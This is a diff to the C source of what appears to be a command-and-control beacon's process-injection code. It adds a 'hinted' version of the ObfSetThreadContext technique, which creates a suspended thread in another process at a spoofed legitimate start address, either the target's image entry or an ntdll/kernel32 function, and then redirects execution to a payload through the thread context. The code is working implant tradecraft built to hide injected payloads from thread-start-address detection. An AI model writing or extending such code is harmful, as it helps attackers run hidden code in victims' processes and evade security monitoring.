@@ -103,14 +103,20 @@ static void * remote_exe_entry_x64(HANDLE hProcess) {
 	return (void *)(DWORD_PTR)((unsigned char *)(DWORD_PTR)imagebase + *aoep);
 }
 
-/* 4.11 ObfSetThreadContext: legit start address, payload via context */
-BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
+/* 4.11 ObfSetThreadContext: legit start address, payload via context.
+ *
+ * legitStart is the thread's kernel-recorded start address. It comes from
+ * the profile's `ObfSetThreadContext "module!function+0x##"` form (resolved
+ * in THIS process - valid because the manual only recommends ntdll/kernel32,
+ * which share a base across processes); NULL selects the default, the
+ * target's own image entry point. lpStartAddress is the payload. */
+BOOL inject_via_obfsetthreadcontext_hinted(INJECTCONTEXT * context, LPVOID legitStart, LPVOID lpStartAddress, LPVOID lpParameter) {
 #if !defined _M_X64
 	/* 4.11 constraint: same architecture, x64 only */
+	(void)legitStart; (void)lpStartAddress; (void)lpParameter;
 	return FALSE;
 #else
 	HANDLE hThread = NULL;
-	void * legit = NULL;
 	CONTEXT c;
 
 	spawn_log("obf: chain entry pid=", (long)context->pid);
@@ -129,14 +135,16 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 		return FALSE;
 	}
 
-	legit = remote_exe_entry_x64(context->hProcess);
-	if (legit == NULL) {
-		spawn_log("obf: FAIL remote entry walk", 0x7fffffff);
-		return FALSE;
+	if (legitStart == NULL) {
+		legitStart = remote_exe_entry_x64(context->hProcess);
+		if (legitStart == NULL) {
+			spawn_log("obf: FAIL remote entry walk", 0x7fffffff);
+			return FALSE;
+		}
 	}
-	spawn_log("obf: legit entry=", (long)(long long)legit);
+	spawn_log("obf: legit entry=", (long)(long long)legitStart);
 
-	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
+	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legitStart, lpParameter, CREATE_SUSPENDED, NULL);
 	if (hThread == NULL) {
 		spawn_log("obf: FAIL CreateRemoteThread gle=", (long)GetLastError());
 		return FALSE;
@@ -186,6 +194,11 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	spawn_log("obf: resumed, payload=", (long)(long long)lpStartAddress);
 	return TRUE;
 #endif
+}
+
+/* bare `ObfSetThreadContext;` - default start address (the target's image entry) */
+BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
+	return inject_via_obfsetthreadcontext_hinted(context, NULL, lpStartAddress, lpParameter);
 }
 
 /* does the configured process-inject execute chain contain this opcode? */
